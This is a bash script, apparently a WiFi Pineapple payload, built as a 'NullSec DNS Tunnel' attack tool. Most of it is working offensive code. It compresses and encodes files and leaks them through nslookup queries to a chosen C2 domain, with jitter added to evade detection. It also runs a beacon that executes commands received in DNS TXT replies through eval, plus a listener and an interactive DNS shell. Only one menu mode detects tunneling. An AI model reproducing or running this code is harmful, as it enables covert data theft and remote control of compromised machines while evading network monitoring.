#!/bin/bash
#═══════════════════════════════════════════════════════════════════════════════
# NullSec DNS Tunnel
# Covert data exfiltration and C2 over DNS queries
#
# For authorized security testing only!
# Credits: Built for Hak5 WiFi Pineapple - https://hak5.org
#═══════════════════════════════════════════════════════════════════════════════

VERSION="1.0"
LOOT_DIR="/mmc/nullsec/dns-tunnel"
DATE_TAG=$(date +%Y%m%d_%H%M%S)
C2_DOMAIN=""
TUNNEL_IFACE="wlan0"
DNS_PORT=53
CHUNK_SIZE=60
ENCODE_METHOD="base32"
LOG_FILE="$LOOT_DIR/tunnel_${DATE_TAG}.log"

mkdir -p "$LOOT_DIR"

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
MAGENTA='\033[0;35m'
NC='\033[0m'

banner() {
    echo -e "${RED}"
    cat << 'EOF'
    ╔═══════════════════════════════════════════════════════════════╗
    ║              NULLSEC DNS TUNNEL v1.0                          ║
    ║                                                               ║
    ║          Covert Channel over DNS                              ║
    ╚═══════════════════════════════════════════════════════════════╝
EOF
    echo -e "${NC}"
}

log() {
    local level="$1"
    shift
    case "$level" in
        INFO)  echo -e "${GREEN}[INFO]${NC} $*" ;;
        WARN)  echo -e "${YELLOW}[WARN]${NC} $*" ;;
        ALERT) echo -e "${RED}[ALERT]${NC} $*" ;;
        DATA)  echo -e "${CYAN}[DATA]${NC} $*" ;;
        C2)    echo -e "${MAGENTA}[C2]${NC} $*" ;;
    esac
    echo "[$(date '+%H:%M:%S')] [$level] $*" >> "$LOG_FILE"
}

# Encode data for DNS-safe transport
encode_chunk() {
    local data="$1"
    case "$ENCODE_METHOD" in
        base32)
            echo -n "$data" | base32 | tr '=' '-' | tr '+/' '_~' | tr '[:upper:]' '[:lower:]'
            ;;
        base64)
            echo -n "$data" | base64 | tr '=' '-' | tr '+/' '_~'
            ;;
        hex)
            echo -n "$data" | xxd -p | tr -d '\n'
            ;;
    esac
}

# Decode received DNS data
decode_chunk() {
    local data="$1"
    case "$ENCODE_METHOD" in
        base32)
            echo -n "$data" | tr '[:lower:]' '[:upper:]' | tr '-' '=' | tr '_~' '+/' | base32 -d 2>/dev/null
            ;;
        base64)
            echo -n "$data" | tr '-' '=' | tr '_~' '+/' | base64 -d 2>/dev/null
            ;;
        hex)
            echo -n "$data" | xxd -r -p 2>/dev/null
            ;;
    esac
}

# Exfiltrate file via DNS queries
exfil_file() {
    local file="$1"
    
    if [ ! -f "$file" ]; then
        log WARN "File not found: $file"
        return 1
    fi
    
    local filesize=$(stat -c%s "$file")
    log DATA "Exfiltrating: $file ($filesize bytes)"
    
    # Compress first
    local compressed="/tmp/dns_exfil_$$.gz"
    gzip -c "$file" > "$compressed"
    local compsize=$(stat -c%s "$compressed")
    log DATA "Compressed: $compsize bytes"
    
    # Split into DNS-safe chunks
    local total_chunks=$(( (compsize + CHUNK_SIZE - 1) / CHUNK_SIZE ))
    log DATA "Chunks: $total_chunks (${CHUNK_SIZE}B each)"
    
    # Send file header
    local basename=$(basename "$file")
    local header="HDR|${basename}|${filesize}|${total_chunks}|${ENCODE_METHOD}"
    local enc_header=$(encode_chunk "$header")
    nslookup "${enc_header}.h.${C2_DOMAIN}" 2>/dev/null
    sleep 0.5
    
    # Send chunks
    local chunk_num=0
    xxd -p "$compressed" | fold -w $((CHUNK_SIZE * 2)) | while read -r hex_chunk; do
        chunk_num=$((chunk_num + 1))
        
        # Format: <seq>.<encoded_data>.d.<domain>
        local subdomain=$(echo -n "$hex_chunk" | fold -w 63 | paste -sd '.' -)
        nslookup "${chunk_num}.${subdomain}.d.${C2_DOMAIN}" 2>/dev/null
        
        # Progress
        local pct=$((chunk_num * 100 / total_chunks))
        printf "\r${CYAN}[EXFIL]${NC} Progress: %d/%d (%d%%)" "$chunk_num" "$total_chunks" "$pct"
        
        # Jitter to avoid detection
        sleep $(awk "BEGIN{srand(); print 0.1 + rand() * 0.5}")
    done
    
    echo ""
    
    # Send completion marker
    nslookup "FIN.${total_chunks}.f.${C2_DOMAIN}" 2>/dev/null
    
    log DATA "Exfiltration complete: $total_chunks chunks sent"
    rm -f "$compressed"
}

# C2 beacon - poll for commands
c2_beacon() {
    log C2 "Starting C2 beacon to ${C2_DOMAIN}..."
    
    local beacon_id=$(cat /dev/urandom | tr -dc 'a-f0-9' | fold -w 8 | head -1)
    log C2 "Beacon ID: $beacon_id"
    
    while true; do
        # Send check-in beacon
        local sysinfo=$(hostname | head -c 20)
        local checkin=$(encode_chunk "CHK|${beacon_id}|${sysinfo}")
        
        # Query TXT record for commands
        local response=$(nslookup -type=TXT "${checkin}.c.${C2_DOMAIN}" 2>/dev/null | \
            grep -oP '"[^"]*"' | tr -d '"')
        
        if [ -n "$response" ] && [ "$response" != "NOP" ]; then
            local cmd=$(decode_chunk "$response")
            log C2 "Command received: $cmd"
            
            # Execute command
            local output=$(eval "$cmd" 2>&1 | head -c 500)
            
            # Send result back via DNS
            local enc_output=$(encode_chunk "RSP|${beacon_id}|${output}")
            echo "$enc_output" | fold -w 63 | while read -r chunk; do
                nslookup "${chunk}.r.${C2_DOMAIN}" 2>/dev/null
                sleep 0.2
            done
            
            log C2 "Response sent (${#output} bytes)"
        fi
        
        # Random jitter beacon interval (30-120 seconds)
        local interval=$(awk "BEGIN{srand(); print int(30 + rand() * 90)}")
        log C2 "Next beacon in ${interval}s"
        sleep "$interval"
    done
}

# DNS listener / server mode
dns_listener() {
    log INFO "Starting DNS listener on port $DNS_PORT..."
    
    REASSEMBLY_DIR="$LOOT_DIR/reassembly"
    mkdir -p "$REASSEMBLY_DIR"
    
    # Use tcpdump to capture DNS queries
    tcpdump -i "$TUNNEL_IFACE" -l port $DNS_PORT 2>/dev/null | while read -r line; do
        # Extract queried hostname
        local query=$(echo "$line" | grep -oP 'A\? \K[^ ]+' | sed 's/\.$//')
        
        if [ -z "$query" ]; then continue; fi
        
        # Parse tunnel protocol
        if echo "$query" | grep -q "\.h\.${C2_DOMAIN}$"; then
            # File header
            local header_data=$(echo "$query" | sed "s/\.h\.${C2_DOMAIN}$//")
            local decoded=$(decode_chunk "$header_data")
            log DATA "File header: $decoded"
            echo "$decoded" > "$REASSEMBLY_DIR/current_header.txt"
            
        elif echo "$query" | grep -q "\.d\.${C2_DOMAIN}$"; then
            # Data chunk
            local chunk_data=$(echo "$query" | sed "s/\.d\.${C2_DOMAIN}$//" | tr '.' '')
            local seq=$(echo "$chunk_data" | cut -d. -f1)
            local hex_data=$(echo "$chunk_data" | cut -d. -f2-)
            echo "$hex_data" >> "$REASSEMBLY_DIR/chunks.hex"
            log DATA "Chunk $seq received"
            
        elif echo "$query" | grep -q "\.f\.${C2_DOMAIN}$"; then
            # Completion - reassemble
            log DATA "Transfer complete. Reassembling..."
            local outfile="$LOOT_DIR/received_$(date +%s).gz"
            xxd -r -p "$REASSEMBLY_DIR/chunks.hex" > "$outfile"
            gunzip "$outfile" 2>/dev/null
            log DATA "File saved: $outfile"
            rm -f "$REASSEMBLY_DIR/chunks.hex"
            
        elif echo "$query" | grep -q "\.c\.${C2_DOMAIN}$"; then
            # C2 check-in
            local checkin_data=$(echo "$query" | sed "s/\.c\.${C2_DOMAIN}$//")
            local decoded=$(decode_chunk "$checkin_data")
            log C2 "Beacon: $decoded"
            
        elif echo "$query" | grep -q "\.r\.${C2_DOMAIN}$"; then
            # C2 response
            local resp_data=$(echo "$query" | sed "s/\.r\.${C2_DOMAIN}$//")
            local decoded=$(decode_chunk "$resp_data")
            log C2 "Response: $decoded"
        fi
    done
}

# Interactive shell over DNS
dns_shell() {
    log C2 "Starting interactive DNS shell..."
    
    local shell_id=$(cat /dev/urandom | tr -dc 'a-f0-9' | fold -w 8 | head -1)
    
    while true; do
        echo -ne "${RED}dns-shell${NC}> "
        read -r cmd
        
        [ "$cmd" = "exit" ] && break
        [ -z "$cmd" ] && continue
        
        # Encode and send command
        local enc_cmd=$(encode_chunk "CMD|${shell_id}|${cmd}")
        echo "$enc_cmd" | fold -w 63 | while read -r chunk; do
            nslookup "${chunk}.x.${C2_DOMAIN}" 2>/dev/null
            sleep 0.1
        done
        
        # Wait for response
        sleep 2
        
        # Poll for response via TXT lookup
        local response=$(nslookup -type=TXT "poll.${shell_id}.p.${C2_DOMAIN}" 2>/dev/null | \
            grep -oP '"[^"]*"' | tr -d '"')
        
        if [ -n "$response" ]; then
            decode_chunk "$response"
        else
            echo -e "${YELLOW}[No response]${NC}"
        fi
    done
}

# Detect DNS tunneling (defensive mode)
detect_tunneling() {
    log INFO "Monitoring for DNS tunneling activity..."
    
    DETECT_LOG="$LOOT_DIR/dns_anomalies_${DATE_TAG}.txt"
    
    # Capture DNS traffic
    tcpdump -i "$TUNNEL_IFACE" -l port 53 2>/dev/null | while read -r line; do
        local query=$(echo "$line" | grep -oP 'A\? \K[^ ]+')
        [ -z "$query" ] && continue
        
        local qlen=${#query}
        local labels=$(echo "$query" | tr '.' '\n' | wc -l)
        local entropy=$(echo -n "$query" | fold -w1 | sort | uniq -c | \
            awk '{n+=$1; a[NR]=$1} END{for(i in a) {p=a[i]/n; e-=p*log(p)/log(2)} print e}')
        
        SUSPICIOUS=0
        
        # Long query (>50 chars)
        [ "$qlen" -gt 50 ] && SUSPICIOUS=$((SUSPICIOUS + 1))
        
        # Many labels
        [ "$labels" -gt 5 ] && SUSPICIOUS=$((SUSPICIOUS + 1))
        
        # High entropy (encoded data)
        [ "$(echo "$entropy > 3.5" | bc 2>/dev/null)" = "1" ] && SUSPICIOUS=$((SUSPICIOUS + 1))
        
        # Known tunnel patterns
        echo "$query" | grep -qiE "^[a-z2-7]{20,}\." && SUSPICIOUS=$((SUSPICIOUS + 1))
        
        if [ "$SUSPICIOUS" -ge 2 ]; then
            log ALERT "DNS TUNNEL SUSPECTED: $query"
            log ALERT "  Length: $qlen | Labels: $labels | Entropy: $entropy"
            echo "$query|$qlen|$labels|$entropy" >> "$DETECT_LOG"
        fi
    done
}

# Menu
menu() {
    echo -e "\n${CYAN}DNS Tunnel Modes:${NC}"
    echo -e "  ${GREEN}1)${NC} Exfiltrate File"
    echo -e "  ${GREEN}2)${NC} C2 Beacon (client)"
    echo -e "  ${GREEN}3)${NC} DNS Listener (server)"
    echo -e "  ${GREEN}4)${NC} Interactive DNS Shell"
    echo -e "  ${GREEN}5)${NC} Detect DNS Tunneling (defense)"
    echo -e "  ${GREEN}0)${NC} Exit"
    echo -ne "\n${YELLOW}Select mode: ${NC}"
    read -r mode
    
    case $mode in
        1)
            echo -ne "${YELLOW}C2 Domain: ${NC}"; read -r C2_DOMAIN
            echo -ne "${YELLOW}File path: ${NC}"; read -r filepath
            exfil_file "$filepath"
            ;;
        2)
            echo -ne "${YELLOW}C2 Domain: ${NC}"; read -r C2_DOMAIN
            c2_beacon
            ;;
        3)
            echo -ne "${YELLOW}C2 Domain: ${NC}"; read -r C2_DOMAIN
            dns_listener
            ;;
        4)
            echo -ne "${YELLOW}C2 Domain: ${NC}"; read -r C2_DOMAIN
            dns_shell
            ;;
        5) detect_tunneling ;;
        0) exit 0 ;;
    esac
}

main() {
    banner
    
    while true; do
        menu
    done
}

main "$@"
